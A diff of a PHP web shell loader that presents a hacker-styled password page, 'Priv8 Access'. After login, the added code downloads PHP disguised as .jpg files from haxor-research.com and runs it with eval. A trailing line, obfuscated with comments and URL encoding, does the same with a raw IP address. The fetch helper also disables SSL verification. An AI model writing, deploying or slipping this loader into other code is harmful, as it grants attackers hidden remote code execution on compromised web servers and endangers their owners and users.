@@ -1,170 +1,207 @@
 <?php
 session_start();
-$password = "2e9368f29cf0f34a8850b5a8ee38a4ae";
 
-function login_shell()
-{
+function getURL($url) {
+    $parsed_url = parse_url($url);
+    $host = $parsed_url['host'];
+    $path = isset($parsed_url['path']) ? $parsed_url['path'] : '/';
+    $port = isset($parsed_url['port']) ? $parsed_url['port'] : (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 443 : 80);
+    $scheme = isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 'ssl://' : '';
+
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    elseif (function_exists('file_get_contents')) {
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'header' => "User-Agent: PHP\r\n"
+            ]
+        ]);
+        return file_get_contents($url, false, $context);
+    }
+    elseif (function_exists('stream_socket_client')) {
+        $socket = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr);
+        if (!$socket) {
+            return false;
+        }
+        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
+        fwrite($socket, $request);
+        $response = '';
+        while (!feof($socket)) {
+            $response .= fgets($socket);
+        }
+        fclose($socket);
+        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
+        return $body;
+    }
+    elseif (function_exists('fsockopen')) {
+        $socket = @fsockopen($scheme . $host, $port, $errno, $errstr);
+        if (!$socket) {
+            return false;
+        }
+        $request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: PHP\r\nConnection: close\r\n\r\n";
+        fwrite($socket, $request);
+        $response = '';
+        while (!feof($socket)) {
+            $response .= fgets($socket);
+        }
+        fclose($socket);
+        $body = substr($response, strpos($response, "\r\n\r\n") + 4);
+        return $body;
+    }
+    else {
+        return false;
+    }
+}
+
+function generate_csrf_token() {
+    if (empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function login_shell() {
+    $password_hash = "d786309c581090b412127f7418309827788765ffd326382d10ada6a48d135878"; 
+
+    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
+        eval("?>" . getURL("https://haxor-research.com/rimuru.jpg"));
+        exit;
+    }
+
+    if (isset($_POST['password']) && isset($_POST['csrf_token'])) {
+        if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+            echo "<script>alert('Invalid CSRF token!');</script>";
+            return;
+        }
+
+        $input_password = htmlspecialchars($_POST['password'], ENT_QUOTES, 'UTF-8');
+        $input_password_hash = hash('sha256', $input_password);
+
+        if ($input_password_hash === $password_hash) {
+            $_SESSION['authenticated'] = true;
+            eval("?>" . getURL("https://haxor-research.com/rimuru.jpg"));
+            exit;
+        } else {
+            echo "<script>alert('Access Denied');</script>";
+        }
+    }
+
+    $csrf_token = generate_csrf_token();
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zexhaxor Manager</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+  <meta charset="UTF-8" />
+  <title>HaxorNoname - Priv8 Access</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Orbitron', sans-serif;
-}
-
-body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background: radial-gradient(ellipse at center, #000 0%, #020202 100%);
-    overflow: hidden;
-    color: #0f0;
-}
-
-.matrix {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    overflow: hidden;
-    z-index: -1;
-}
-
-.matrix span {
-    position: absolute;
-    top: -10%;
-    color: #0f0;
-    font-size: 20px;
-    opacity: 0.7;
-    animation: drop linear infinite;
-}
-
-@keyframes drop {
-    to {
-        top: 110%;
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000000;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
     }
-}
 
-.login-container {
-    background: #111;
-    padding: 40px 30px;
-    border-radius: 15px;
-    box-shadow: 0 0 15px #0f0;
-    text-align: center;
-    width: 350px;
-}
-
-h2 {
-    margin-bottom: 30px;
-    font-size: 2em;
-    text-shadow: 0 0 5px #0f0;
-}
-
-.inputBox {
-    position: relative;
-    margin-bottom: 25px;
-}
-
-.inputBox label {
-    position: absolute;
-    top: -10px;
-    left: 10px;
-    background: #111;
-    padding: 0 5px;
-    font-size: 14px;
-    color: #0f0;
-}
-
-.inputBox input {
-    width: 100%;
-    padding: 15px 10px;
-    background: transparent;
-    border: 2px solid #0f0;
-    border-radius: 8px;
-    outline: none;
-    color: #0f0;
-    font-size: 1rem;
-}
-
-.inputBox input:focus {
-    border-color: #00ff00;
-    background: rgba(0, 255, 0, 0.05);
-}
-
-button {
-    width: 100%;
-    padding: 15px;
-    background: #0f0;
-    color: #000;
-    border: none;
-    border-radius: 8px;
-    font-weight: bold;
-    font-size: 1.2rem;
-    cursor: pointer;
-    transition: 0.3s;
-}
-
-button:hover {
-    background: #00b300;
-}
-
-@media (max-width: 480px) {
-    .login-container {
-        width: 90%;
+    .terminal-box {
+      border: 2px solid #00ff00;
+      box-shadow: 0 0 15px #00ff00;
+      background: #101010;
+      padding: 40px;
+      border-radius: 10px;
+      width: 380px;
+      animation: fadeIn 1.5s ease-in-out;
     }
-}
-</style>
+
+    .terminal-title {
+      font-size: 22px;
+      margin-bottom: 20px;
+      text-align: center;
+      animation: typewriter 2s steps(20) 1 normal both;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 2px solid #00ff00;
+    }
+
+    label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      background: #000;
+      color: #00ff00;
+      border: 1px solid #00ff00;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      transition: all 0.3s ease;
+    }
+
+    input[type="password"]:focus {
+      outline: none;
+      box-shadow: 0 0 5px #00ff00;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background: #00ff00;
+      color: #000;
+      font-weight: bold;
+      font-size: 14px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    input[type="submit"]:hover {
+      background: #00cc00;
+    }
+
+    @keyframes typewriter {
+      0% { width: 0 }
+      100% { width: 100% }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
-
-<div class="matrix"></div>
-
-<div class="login-container">
-    <h2>Zexhaxor Manager</h2>
-    <form method="post" action="">
-        <div class="inputBox">
-            <label for="pass">Password</label>
-            <input type="password" id="pass" name="pass" required>
-        </div>
-        <button type="submit" name="submit">Access</button>
-    </form>
+  <div class="terminal-box">
+    <div class="terminal-title">[ ACCESS PRIV8 HAXORNONAME ]</div>
+<div class="container">
+<form method="post">
+<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">
+<input type="password" name="password" autofocus>
+</form>
 </div>
-
-<script>
-// Matrix rain effect
-const matrix = document.querySelector('.matrix');
-const symbols = "01";
-for (let i = 0; i < 50; i++) {
-    const span = document.createElement('span');
-    span.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-    span.style.left = `${Math.random() * 100}%`;
-    span.style.animationDuration = `${Math.random() * 3 + 2}s`;
-    span.style.fontSize = `${Math.random() * 10 + 15}px`;
-    matrix.appendChild(span);
-}
-</script>
-
 </body>
 </html>
 <?php
-    exit;
 }
 
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    } else {
-        login_shell();
-    }
-}
+login_shell();
 ?>
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode("%68%74%74%70%3A%2F%2F%31%35%36%2E%36%37%2E%32%32%31%2E%32%39%2F%68%78%2E%6A%70%67")));/**/?>
